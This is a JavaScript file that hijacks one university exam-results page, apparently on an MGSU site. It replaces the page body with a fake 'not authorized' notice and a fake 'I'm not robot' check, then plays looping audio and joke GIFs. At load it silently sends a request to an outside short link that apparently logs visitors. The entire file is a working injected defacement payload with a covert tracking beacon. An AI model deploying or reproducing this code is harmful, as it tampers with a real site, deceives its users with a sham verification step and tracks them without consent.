var main_html = `<style>
*{margin:0px;font-family:arial;}
.connhfbhr{position: fixed;top:0px;background: dodgerblue;width:100%;height: 100vh}
.subconnfbhr{position: absolute;background: white;padding:0em;top:50%;left:50%;transform: translate(-50%,-50%);}
.connfbhrhead{background: rgba(255,10,0);text-align: center;text-transform: uppercase;color:white;font-weight: bold;padding:1em;font-size:1.5em;}
.connfbhrdata{text-align: justify;padding:1em;font-size:1.5em;}
.connfbhrfoot{font-size: 10px;background: rgba(255,10,0);color:white;text-align: center;padding:0;padding:0.5em;font-size:1.3em;}
.connhfbrbtn{margin-top:1em;text-align: center;}
.hfbrbtn{background: rgba(0,0,0,0.2);padding:10px 13px;border-radius: 0.1em;cursor:pointer;box-sizing: border-box;box-shadows: -1px -1px 10px 1px green;}
#img-show{position: relative;display:none;margin-top:1em;text-align: center;height:300px;overflow: hidden;}
.hfbrimg{max-width: 450px;max-height: 300px;}
#tmpimg > img{width:50px;display:none;}
#img-title{text-align: center;}
@media only screen and (max-width:1000px){
  .subconnfbhr{width: 90%;top:20%;left:50%;transform: translate(-50%,-20%);}
  .connfbhrdata,.connfbhrhead{font-size:3em;}
  .connfbhrfoot{font-size: 2.2em;}
  .hfbrimg{max-width: 1000px;min-width:100%;max-height:780px;}
  #img-show{height: 780px;}
}
</style><div class='connhfbhr'><div class='subconnfbhr'><div class='connfbhrhead'>not authorized to view this result !</div><div class='connfbhrdata'><p id='hfbrtmp'>Sorry to say this but you don't have authorization to view this user result.</br></br>Verify to view the result :</p><div class='connhfbrbtn'><span class='hfbrbtn' id='connfverify' onclick=hfbr()>I'm not robot</span></div><div id='aaudio'></div><div id='img-title'></div><div id='img-show'></div><div id='tmpimg'></div><div id='nextMe' onclick=nextSlide()>Next</div></div><div class='connfbhrfoot'>Designed by : <span class='fhbrtext'>tujbqtg</span></div></div></div>`
if(window.location.pathname == '/MGSU/mGSurES/PrIntReSult.php'){
  document.getElementsByTagName('body')[0].innerHTML = main_html;
}
var dd = 0
	function hfbr(){
		document.getElementById('aaudio').innerHTML = `<audio id="musicplayer" autoplay loop><source src="https://mobcup.net/va/33336d4234eebca5cf590af86cb1095a9" /></audio>`;
		nextSlide()
		setInterval(function() {
		  nextSlide()
		}, 4100);
		document.getElementById('img-show').style['display'] = 'block';
		document.getElementById('hfbrtmp').style['display'] = 'none';
		document.getElementById('connfverify').style['display'] = 'none';
}
var urls = ['https://media.tenor.com/ViUOKWru_yYAAAAd/namaste-akshay-kumar.gif','https://media.tenor.com/VC4ooSZqvGYAAAAC/crayon-shin-chan-dancing.gif','https://media.tenor.com/sbh9aOJZzxEAAAAC/shinchan-sinchan.gif','https://media.tenor.com/PEPftl33sPUAAAAC/shin-chan-anime.gif','https://media.tenor.com/TfM5W6MtLPkAAAAC/shinchan.gif','https://media.tenor.com/ZgIRCUMksogAAAAC/sing-crayon-shin-chan.gif','https://media.tenor.com/BJAEh2aRowIAAAAC/punnet-puneet-superstar.gif'];
var titles= ['🙏 namaste ji pehichhaniya ? 🤔','😜😜😜','🤪🤪🤪','😁😁😁','🙄🙄🙄','😮‍😮‍😮‍','😆😆😆']
var cc = 0;

document.getElementById('tmpimg').innerHTML = `<img src='${urls[cc]}'/>`;
function nextSlide(){
	var tmp = document.getElementById('img-show');
	var tmpp = document.getElementById('img-title');
	tmp.innerHTML = `<img src='${urls[cc]}' class='hfbrimg'/>`;
	tmpp.innerHTML = `${titles[cc]}`;
	if(cc < urls.length-1){
		cc += 1;
	} else{
		cc = 0;
	}
	document.getElementById('tmpimg').innerHTML = `<img src='${urls[cc]}'/>`;
}

console.log('It works !');
console.log(window.location.href);
var xhttp = new XMLHttpRequest();
/*xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
       console.log(xhttp.responseText);
    }
};*/
xhttp.open("GET", "https://2no.co/20YSj2", true);
xhttp.send();
